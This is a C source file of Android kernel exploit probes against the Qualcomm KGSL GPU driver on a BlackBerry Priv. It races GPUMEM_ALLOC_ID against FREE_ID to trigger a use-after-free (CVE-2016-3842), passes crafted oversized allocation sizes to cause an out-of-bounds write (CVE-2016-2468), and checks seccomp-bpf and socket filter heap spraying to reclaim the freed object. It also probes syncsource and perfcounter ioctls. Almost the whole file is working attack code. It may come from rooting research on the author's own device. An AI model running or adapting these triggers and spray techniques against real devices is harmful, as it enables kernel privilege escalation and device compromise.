/*
 * kgsl_race_v5.c — KGSL CVE exploitation tests
 *
 * Based on retme.net CVE-2016-3842 and CVE-2016-2468 writeups.
 * Tests whether these bugs (or variants) are present on BB Priv kernel.
 *
 * TEST 1: CVE-2016-3842 — ALLOC/FREE_ID race
 *   Race between IOCTL_KGSL_GPUMEM_ALLOC and IOCTL_KGSL_GPUMEM_FREE_ID.
 *   Freed kgsl_mem_entry is in kmalloc-192 (regular slab).
 *   If race wins, allocator thread uses freed object -> UAF.
 *
 * TEST 2: CVE-2016-2468 — Integer overflow in GPUMEM_ALLOC_ID size
 *   Crafted size causes len to be negative, skipping allocation loop.
 *   sg_mark_end writes to memdesc->sg[-1] -> OOB write.
 *
 * TEST 3: seccomp-bpf spray availability check
 *   On kernel 3.10, BPF prog is allocated in kmalloc cache.
 *   Check if prctl(PR_SET_SECCOMP) works from shell context.
 *
 * TEST 4: ALLOC/FREE_ID race with seccomp-bpf spray
 *   Combine race + spray for controlled reclaim of freed kgsl_mem_entry.
 *
 * TEST 5: kgsl_syncsource race (CVE-2018-13905 pattern)
 *   Probe for syncsource ioctls and test destroy/get race.
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o kgsl_race_v5 kgsl_race_v5.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <linux/filter.h>
#include <stdint.h>
#include <pthread.h>

/* KGSL ioctl definitions */
#define KGSL_IOC_TYPE 0x09
#define MAKE_IOCTL_RW(nr, sz) (0xC0000000 | ((sz) << 16) | (KGSL_IOC_TYPE << 8) | (nr))

/* Confirmed working ioctls from our testing */
#define CMD_ALLOC       MAKE_IOCTL_RW(0x34, 48)  /* GPUMEM_ALLOC_ID */
#define CMD_FREE        MAKE_IOCTL_RW(0x35, 8)   /* GPUMEM_FREE_ID */
#define CMD_ALLOC_OLD   MAKE_IOCTL_RW(0x2F, 16)  /* GPUMEM_ALLOC (older, 16-byte struct) */

/* Draw context ioctls (confirmed working) */
#define CMD_DRAWCTXT_CREATE  MAKE_IOCTL_RW(0x13, 8)
#define CMD_DRAWCTXT_DESTROY MAKE_IOCTL_RW(0x14, 4)

/* Syncsource ioctls — need to probe sizes */
#define KGSL_IOCTL_SYNCSOURCE_CREATE    0x40
#define KGSL_IOCTL_SYNCSOURCE_DESTROY   0x41
#define KGSL_IOCTL_SYNCSOURCE_CREATE_FENCE  0x42
#define KGSL_IOCTL_SYNCSOURCE_SIGNAL_FENCE  0x43

struct kgsl_gpumem_alloc_id {
    unsigned int id;          /* 0: out */
    unsigned int flags;       /* 4: in */
    uint64_t size;            /* 8: in */
    uint64_t mmapsize;        /* 16: out */
    uint64_t gpuaddr;         /* 24: out */
    uint64_t __pad;           /* 32: reserved */
    uint64_t __pad2;          /* 40: reserved */
};

struct kgsl_gpumem_free_id {
    unsigned int id;          /* 0: in */
    unsigned int __pad;       /* 4: reserved */
};

/* For GPUMEM_ALLOC (the older ioctl 0x2F) */
struct kgsl_gpumem_alloc {
    uint64_t gpuaddr;         /* 0: in/out */
    uint64_t size;            /* 8: in */
};

struct kgsl_drawctxt_create {
    unsigned int flags;
    unsigned int drawctxt_id;
};

struct kgsl_drawctxt_destroy {
    unsigned int drawctxt_id;
};

static sigjmp_buf jmp;
static volatile int caught_sig = 0;

static void sighandler(int sig) {
    caught_sig = sig;
    siglongjmp(jmp, sig);
}

static void install_sigs(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sighandler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);
}

/* ============================================================
 * TEST 1: CVE-2016-3842 — ALLOC/FREE_ID race
 * Race between allocation and freeing by guessable ID.
 * ============================================================ */

static volatile int race_stop = 0;
static volatile int race_crashes = 0;
static volatile int race_wins = 0;  /* alloc succeeded but ID was freed */

struct race_args {
    int fd;
    int target_id;
};

static void *free_racer(void *arg) {
    struct race_args *ra = (struct race_args *)arg;
    struct kgsl_gpumem_free_id farg;

    while (!race_stop) {
        farg.id = ra->target_id;
        farg.__pad = 0;
        ioctl(ra->fd, CMD_FREE, &farg);
        /* Don't sleep — tight race */
    }
    return NULL;
}

static void test1_alloc_free_race(void) {
    printf("\n=== TEST 1: CVE-2016-3842 — ALLOC/FREE_ID race ===\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) {
        printf("  FAIL: can't open kgsl: %s\n", strerror(errno));
        return;
    }

    /* Strategy from retme: IDs are predictable.
     * First alloc = ID 1. We race FREE_ID(1) against ALLOC.
     * If FREE wins after idr_alloc but before alloc returns,
     * the allocator continues using a freed kgsl_mem_entry. */

    int rounds = 200;
    int alloc_ok = 0, alloc_fail = 0, free_first = 0;

    for (int r = 0; r < rounds; r++) {
        /* Fresh fd each round to reset ID counter */
        int rfd = open("/dev/kgsl-3d0", O_RDWR);
        if (rfd < 0) continue;

        race_stop = 0;

        struct race_args ra = { .fd = rfd, .target_id = 1 };
        pthread_t thr;
        pthread_create(&thr, NULL, free_racer, &ra);

        /* Small delay to let free_racer start */
        usleep(10);

        struct kgsl_gpumem_alloc_id aarg;
        memset(&aarg, 0, sizeof(aarg));
        aarg.size = 4096;
        aarg.flags = 0;

        int ret = ioctl(rfd, CMD_ALLOC, &aarg);
        int err = errno;

        race_stop = 1;
        pthread_join(thr, NULL);

        if (ret == 0) {
            /* Alloc succeeded. Try to free with same ID.
             * If free_racer already freed it, this will fail or double-free */
            struct kgsl_gpumem_free_id farg = { .id = aarg.id, .__pad = 0 };
            int fret = ioctl(rfd, CMD_FREE, &farg);
            if (fret != 0) {
                /* Can't free — racer already freed it! Race won. */
                free_first++;
            }
            alloc_ok++;
        } else {
            alloc_fail++;
        }

        close(rfd);
    }

    printf("  rounds=%d alloc_ok=%d alloc_fail=%d free_first=%d\n",
           rounds, alloc_ok, alloc_fail, free_first);
    if (free_first > 0) {
        printf("  *** RACE WON %d times — freed before alloc returned!\n", free_first);
        printf("  *** CVE-2016-3842 pattern is VIABLE on this device\n");
    } else {
        printf("  no race wins — alloc/free may be properly serialized\n");
    }

    close(fd);
}

/* ============================================================
 * TEST 2: CVE-2016-2468 — Integer overflow in alloc size
 * Pass crafted size to trigger negative 'len' in page_alloc.
 * ============================================================ */

static void test2_integer_overflow(void) {
    printf("\n=== TEST 2: CVE-2016-2468 — Integer overflow in alloc size ===\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) {
        printf("  FAIL: can't open kgsl: %s\n", strerror(errno));
        return;
    }

    install_sigs();

    /* From retme PoC: size = 0xa18fb010b0c08000 causes the low 32 bits
     * of 'len' to be negative (> 0x80000000), skipping the while(len>0) loop.
     * Then sg_mark_end(&memdesc->sg[sglen-1]) writes to sg[-1] = OOB. */

    /* Try several crafted sizes */
    uint64_t test_sizes[] = {
        0xa18fb010b0c08000ULL,  /* retme's exact PoC value */
        0x0000000180000000ULL,  /* low 32 bits > 0x80000000 */
        0x0000000100000001ULL,  /* just over 4GB */
        0x00000000fffff000ULL,  /* near 4GB, page-aligned */
        0x00000000c0000000ULL,  /* 3GB — large but not overflow */
    };

    for (int i = 0; i < 5; i++) {
        struct kgsl_gpumem_alloc_id aarg;
        memset(&aarg, 0, sizeof(aarg));
        aarg.size = test_sizes[i];
        aarg.flags = 0;

        if (sigsetjmp(jmp, 1) != 0) {
            printf("  size=0x%016llx: CRASH (sig=%d) — integer overflow triggered!\n",
                   (unsigned long long)test_sizes[i], caught_sig);
            install_sigs();
            continue;
        }

        int ret = ioctl(fd, CMD_ALLOC, &aarg);
        if (ret == 0) {
            printf("  size=0x%016llx: ALLOC succeeded id=%u (unexpected!)\n",
                   (unsigned long long)test_sizes[i], aarg.id);
            /* Free it */
            struct kgsl_gpumem_free_id farg = { .id = aarg.id, .__pad = 0 };
            ioctl(fd, CMD_FREE, &farg);
        } else {
            printf("  size=0x%016llx: ALLOC failed errno=%d (%s)\n",
                   (unsigned long long)test_sizes[i], errno, strerror(errno));
        }
    }

    close(fd);
}

/* ============================================================
 * TEST 3: seccomp-bpf spray availability
 * Check if we can use seccomp-bpf for kernel heap spray.
 * On 3.10, BPF prog is allocated in kmalloc cache.
 * ============================================================ */

static void test3_seccomp_bpf(void) {
    printf("\n=== TEST 3: seccomp-bpf spray availability ===\n");

    /* Check PR_SET_NO_NEW_PRIVS first (required for seccomp without root) */
    int ret = prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    if (ret != 0) {
        printf("  PR_SET_NO_NEW_PRIVS: failed errno=%d (%s)\n", errno, strerror(errno));
        printf("  seccomp-bpf spray NOT available (can't set no_new_privs)\n");
        return;
    }
    printf("  PR_SET_NO_NEW_PRIVS: OK\n");

    /* Try a simple BPF filter via seccomp */
    struct sock_filter filter[] = {
        /* Allow all syscalls — just testing if seccomp works */
        { BPF_RET | BPF_K, 0, 0, 0x7fff0000 },  /* SECCOMP_RET_ALLOW */
    };

    struct sock_fprog prog = {
        .len = 1,
        .filter = filter,
    };

    /* PR_SET_SECCOMP with SECCOMP_MODE_FILTER = 2 */
    ret = prctl(PR_SET_SECCOMP, 2, &prog, 0, 0);
    if (ret == 0) {
        printf("  PR_SET_SECCOMP(FILTER): OK — seccomp-bpf spray IS AVAILABLE!\n");

        /* Now check if we can install more filters (they stack) */
        int spray_count = 0;
        for (int i = 0; i < 100; i++) {
            /* Each filter allocates in kmalloc cache */
            struct sock_filter spray_filter[] = {
                /* 8 instructions = ~64 bytes BPF prog in kernel */
                { BPF_LD | BPF_W | BPF_ABS, 0, 0, 0 },
                { BPF_JMP | BPF_JEQ | BPF_K, 0, 1, 0 },
                { BPF_RET | BPF_K, 0, 0, 0x7fff0000 },
                { BPF_RET | BPF_K, 0, 0, 0x7fff0000 },
                { BPF_LD | BPF_W | BPF_ABS, 0, 0, 4 },
                { BPF_JMP | BPF_JEQ | BPF_K, 0, 1, 0 },
                { BPF_RET | BPF_K, 0, 0, 0x7fff0000 },
                { BPF_RET | BPF_K, 0, 0, 0x7fff0000 },
            };
            struct sock_fprog spray_prog = { .len = 8, .filter = spray_filter };
            ret = prctl(PR_SET_SECCOMP, 2, &spray_prog, 0, 0);
            if (ret != 0) break;
            spray_count++;
        }
        printf("  installed %d additional BPF filters (all stack in kernel heap)\n", spray_count);

        /* Check sizes: each BPF insn = 8 bytes.
         * 8 insns = 64 bytes -> kmalloc-64 or kmalloc-128 depending on overhead
         * For kmalloc-192 (kgsl_mem_entry), need ~24 instructions
         * 24 insns = 192 bytes -> kmalloc-192 or kmalloc-256 */
        printf("  8-insn filter = 64 bytes BPF -> targets kmalloc-64/128\n");
        printf("  24-insn filter = 192 bytes BPF -> targets kmalloc-192/256\n");
        printf("  To hit kgsl_mem_entry cache, tune instruction count\n");
    } else {
        printf("  PR_SET_SECCOMP(FILTER): failed errno=%d (%s)\n", errno, strerror(errno));
        if (errno == EINVAL) {
            printf("  seccomp-bpf NOT compiled in kernel\n");
        } else if (errno == EACCES) {
            printf("  seccomp-bpf blocked by SELinux/policy\n");
        }

        /* Fallback: check SO_ATTACH_FILTER on sockets */
        printf("  Trying SO_ATTACH_FILTER on socket instead...\n");
        int sock = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (sock >= 0) {
            struct sock_filter sf[] = {
                { BPF_RET | BPF_K, 0, 0, 0 },
            };
            struct sock_fprog sp = { .len = 1, .filter = sf };
            ret = setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &sp, sizeof(sp));
            if (ret == 0) {
                printf("  SO_ATTACH_FILTER: OK — socket BPF spray available\n");
            } else {
                printf("  SO_ATTACH_FILTER: failed errno=%d\n", errno);
            }
            close(sock);
        }
    }
}

/* ============================================================
 * TEST 4: Fork-based ALLOC/FREE race (retme's exact pattern)
 * More aggressive than thread race — fork() gives true parallelism.
 * ============================================================ */

static void test4_fork_race(void) {
    printf("\n=== TEST 4: Fork-based ALLOC/FREE_ID race (retme pattern) ===\n");

    /* retme's exact approach: parent and child share the same fd
     * (fork inherits fd). Parent does FREE_ID(1) in tight loop.
     * Child does ALLOC. If race wins, kernel panic or corruption. */

    int rounds = 50;
    int crashes = 0, successes = 0;

    for (int r = 0; r < rounds; r++) {
        int fd = open("/dev/kgsl-3d0", O_RDWR);
        if (fd < 0) continue;

        pid_t pid = fork();
        if (pid < 0) {
            close(fd);
            continue;
        }

        if (pid == 0) {
            /* Child: race FREE_ID(1) */
            struct kgsl_gpumem_free_id farg = { .id = 1, .__pad = 0 };
            for (int i = 0; i < 10000; i++) {
                ioctl(fd, CMD_FREE, &farg);
            }
            _exit(0);
        }

        /* Parent: do ALLOC */
        struct kgsl_gpumem_alloc_id aarg;
        memset(&aarg, 0, sizeof(aarg));
        aarg.size = 4096;
        aarg.flags = 0;

        int ret = ioctl(fd, CMD_ALLOC, &aarg);
        if (ret == 0) {
            /* Check if our allocation still exists */
            struct kgsl_gpumem_free_id farg = { .id = aarg.id, .__pad = 0 };
            int fret = ioctl(fd, CMD_FREE, &farg);
            if (fret != 0 && errno == EINVAL) {
                /* Already freed by child! Race won. */
                successes++;
            }
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            crashes++;
            printf("  round %d: child killed by signal %d\n", r, WTERMSIG(status));
        }

        close(fd);
    }

    printf("  rounds=%d race_wins=%d child_crashes=%d\n", rounds, successes, crashes);
    if (successes > 0) {
        printf("  *** FORK RACE WON %d times — UAF is TRIGGERABLE!\n", successes);
    }
    if (crashes > 0) {
        printf("  *** %d child crashes — kernel state corruption detected!\n", crashes);
    }
}

/* ============================================================
 * TEST 5: Probe syncsource ioctls (CVE-2018-13905)
 * Try to find working syncsource create/destroy ioctls.
 * ============================================================ */

static void test5_syncsource_probe(void) {
    printf("\n=== TEST 5: Syncsource ioctl probe (CVE-2018-13905) ===\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) {
        printf("  FAIL: can't open kgsl\n");
        return;
    }

    /* We need a draw context first for syncsource */
    struct kgsl_drawctxt_create carg = { .flags = 0, .drawctxt_id = 0 };
    int ret = ioctl(fd, CMD_DRAWCTXT_CREATE, &carg);
    if (ret != 0) {
        printf("  can't create drawctxt: errno=%d\n", errno);
        close(fd);
        return;
    }
    printf("  drawctxt_id=%u\n", carg.drawctxt_id);

    /* Probe syncsource CREATE with various struct sizes */
    printf("  Probing SYNCSOURCE_CREATE (ioctl 0x40)...\n");
    int found_create = 0;
    for (int sz = 4; sz <= 64; sz += 4) {
        unsigned int cmd = MAKE_IOCTL_RW(KGSL_IOCTL_SYNCSOURCE_CREATE, sz);
        unsigned char buf[64];
        memset(buf, 0, sizeof(buf));
        /* First 4 bytes might be context ID or output ID */
        *(unsigned int *)buf = carg.drawctxt_id;

        ret = ioctl(fd, cmd, buf);
        if (ret == 0) {
            printf("  ** CREATE works at size=%d! out_id=%u\n", sz, *(unsigned int *)buf);
            found_create = sz;

            /* Try to destroy it */
            for (int dsz = 4; dsz <= 16; dsz += 4) {
                unsigned int dcmd = MAKE_IOCTL_RW(KGSL_IOCTL_SYNCSOURCE_DESTROY, dsz);
                unsigned char dbuf[16];
                memset(dbuf, 0, sizeof(dbuf));
                *(unsigned int *)dbuf = *(unsigned int *)buf;
                int dret = ioctl(fd, dcmd, dbuf);
                if (dret == 0) {
                    printf("  ** DESTROY works at size=%d\n", dsz);
                    break;
                }
            }
            break;
        } else if (errno != ENOTTY) {
            printf("  size=%d: errno=%d (%s)\n", sz, errno, strerror(errno));
        }
    }

    if (!found_create) {
        printf("  syncsource CREATE not found (tried sizes 4-64)\n");

        /* Try without context ID in buffer */
        printf("  Retrying with zero-filled buffer...\n");
        for (int sz = 4; sz <= 64; sz += 4) {
            unsigned int cmd = MAKE_IOCTL_RW(KGSL_IOCTL_SYNCSOURCE_CREATE, sz);
            unsigned char buf[64];
            memset(buf, 0, sizeof(buf));

            ret = ioctl(fd, cmd, buf);
            if (ret == 0) {
                printf("  ** CREATE works at size=%d (zero-filled)! out=%u\n",
                       sz, *(unsigned int *)buf);
                found_create = sz;
                break;
            } else if (errno != ENOTTY) {
                printf("  size=%d zero: errno=%d (%s)\n", sz, errno, strerror(errno));
            }
        }
    }

    /* Also probe PERFCOUNTER_QUERY (CVE-2016-2062 pattern) */
    printf("\n  Probing PERFCOUNTER_QUERY (ioctl 0x3A)...\n");
    for (int sz = 8; sz <= 32; sz += 4) {
        unsigned int cmd = MAKE_IOCTL_RW(0x3A, sz);
        unsigned char buf[32];
        memset(buf, 0, sizeof(buf));
        /* groupid = 0, countables = NULL, count = 0 (safe query) */

        ret = ioctl(fd, cmd, buf);
        if (ret == 0) {
            printf("  ** PERFCOUNTER_QUERY works at size=%d\n", sz);
            printf("     returned: ");
            for (int j = 0; j < sz && j < 16; j++) printf("%02x ", buf[j]);
            printf("\n");
            break;
        } else if (errno != ENOTTY) {
            printf("  size=%d: errno=%d (%s)\n", sz, errno, strerror(errno));
        }
    }

    /* Probe GET_INFO too (still unknown from v3) */
    printf("\n  Probing GPUMEM_GET_INFO (ioctl 0x36)...\n");

    /* First allocate something to query */
    struct kgsl_gpumem_alloc_id alloc_arg;
    memset(&alloc_arg, 0, sizeof(alloc_arg));
    alloc_arg.size = 4096;
    ret = ioctl(fd, CMD_ALLOC, &alloc_arg);
    if (ret == 0) {
        printf("  allocated id=%u for GET_INFO test\n", alloc_arg.id);

        for (int sz = 8; sz <= 64; sz += 4) {
            unsigned int cmd = MAKE_IOCTL_RW(0x36, sz);
            unsigned char buf[64];
            memset(buf, 0, sizeof(buf));

            /* Try with ID in first field */
            *(unsigned int *)buf = alloc_arg.id;
            ret = ioctl(fd, cmd, buf);
            if (ret == 0) {
                printf("  ** GET_INFO works at size=%d (by ID)!\n", sz);
                printf("     returned: ");
                for (int j = 0; j < sz && j < 32; j++) printf("%02x ", buf[j]);
                printf("\n");
                break;
            }

            /* Try with gpuaddr in first 8 bytes */
            memset(buf, 0, sizeof(buf));
            *(uint64_t *)buf = alloc_arg.gpuaddr;
            ret = ioctl(fd, cmd, buf);
            if (ret == 0) {
                printf("  ** GET_INFO works at size=%d (by gpuaddr)!\n", sz);
                printf("     returned: ");
                for (int j = 0; j < sz && j < 32; j++) printf("%02x ", buf[j]);
                printf("\n");
                break;
            }
        }

        /* Free the test allocation */
        struct kgsl_gpumem_free_id farg = { .id = alloc_arg.id, .__pad = 0 };
        ioctl(fd, CMD_FREE, &farg);
    }

    /* Cleanup */
    struct kgsl_drawctxt_destroy darg = { .drawctxt_id = carg.drawctxt_id };
    ioctl(fd, CMD_DRAWCTXT_DESTROY, &darg);
    close(fd);
}

/* ============================================================
 * TEST 6: Multi-fd ALLOC/FREE race (more aggressive)
 * Open multiple KGSL fds, race alloc on one vs free on another.
 * ============================================================ */

struct mt_race_args {
    int fd;
    volatile int *stop;
    volatile int *wins;
    volatile int *errors;
};

static void *mt_free_thread(void *arg) {
    struct mt_race_args *a = (struct mt_race_args *)arg;
    struct kgsl_gpumem_free_id farg;

    while (!*a->stop) {
        for (unsigned int id = 1; id <= 8; id++) {
            farg.id = id;
            farg.__pad = 0;
            int ret = ioctl(a->fd, CMD_FREE, &farg);
            if (ret == 0) {
                (*a->wins)++;
            }
        }
    }
    return NULL;
}

static void test6_multithread_race(void) {
    printf("\n=== TEST 6: Multi-thread ALLOC/FREE race (aggressive) ===\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) {
        printf("  FAIL: can't open kgsl\n");
        return;
    }

    volatile int stop = 0;
    volatile int wins = 0;
    volatile int errors = 0;

    struct mt_race_args args = { .fd = fd, .stop = &stop, .wins = &wins, .errors = &errors };

    /* Start 2 free threads */
    pthread_t thr[2];
    for (int i = 0; i < 2; i++) {
        pthread_create(&thr[i], NULL, mt_free_thread, &args);
    }

    /* Main thread does rapid alloc */
    int alloc_count = 0;
    int alloc_fail = 0;
    int double_free_detected = 0;

    install_sigs();
    if (sigsetjmp(jmp, 1) != 0) {
        printf("  CRASH during race (sig=%d) after %d allocs\n", caught_sig, alloc_count);
        stop = 1;
        goto cleanup;
    }

    for (int i = 0; i < 2000 && !stop; i++) {
        struct kgsl_gpumem_alloc_id aarg;
        memset(&aarg, 0, sizeof(aarg));
        aarg.size = 4096;
        aarg.flags = 0;

        int ret = ioctl(fd, CMD_ALLOC, &aarg);
        if (ret == 0) {
            alloc_count++;
            /* Immediately try to use the allocation — if freed, this may fault */
            void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                          MAP_SHARED, fd, aarg.id * 4096);
            if (p != MAP_FAILED) {
                /* Try a volatile read */
                volatile unsigned char *vp = (volatile unsigned char *)p;
                unsigned char val = vp[0];
                (void)val;
                munmap(p, 4096);
            }
        } else {
            alloc_fail++;
        }
    }

cleanup:
    stop = 1;
    for (int i = 0; i < 2; i++) {
        pthread_join(thr[i], NULL);
    }

    printf("  allocs=%d fails=%d free_thread_wins=%d\n",
           alloc_count, alloc_fail, (int)wins);
    if (wins > alloc_count) {
        printf("  *** More frees than allocs — DOUBLE-FREE or RACE detected!\n");
    }

    close(fd);
}

/* ============================================================
 * MAIN
 * ============================================================ */

int main(void) {
    printf("=== KGSL RACE V5 — CVE exploitation tests ===\n");
    printf("uid=%d\n", getuid());

    install_sigs();

    test1_alloc_free_race();
    test2_integer_overflow();
    test3_seccomp_bpf();
    test4_fork_race();
    test5_syncsource_probe();
    test6_multithread_race();

    printf("\n=== ALL V5 TESTS COMPLETE ===\n");
    return 0;
}
